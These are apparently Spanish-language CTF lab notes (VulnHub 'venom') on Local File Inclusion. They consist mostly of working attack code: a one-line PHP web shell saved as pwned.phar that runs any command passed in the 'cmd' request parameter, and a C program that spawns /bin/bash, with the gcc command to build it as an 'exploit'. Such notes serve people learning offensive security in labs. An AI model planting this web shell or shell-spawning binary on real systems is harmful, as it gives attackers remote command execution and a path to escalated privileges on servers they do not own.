# LOCAL FILE INCLUSION LFI
---
## CREACIÓN PHP LFI .phar
Como se ha dicho al principio, el LFI ocurre cuando mediante un campo de entrada se está llamando a la ruta de un archivo local. Típicamente, esta situación la veremos en variables de PHP, pero no hay que limitar la vulnerabilidad a esto porque sería erróneo
```ruby
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/venom/exploits]
└─$ cat pwned.phar        
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: pwned.phar
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?php
   2   │   echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
   3   │ ?>
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
## CREACIÓN EXPLOIT LENGUAJE C

para crear un exploit de lenguaje c, se crear un archivo con la extensión .c y acontinuacion lo siguiente:
```ruby
#include <stdio.h>
#include <stdlib.h>
int main(void){
        system("/bin/bash");
        return 0;
}
```
Una vez creado el archivo se debe compilar para transformarlo en binario.
```ruby
gcc exploit.c -o binarioexploit
```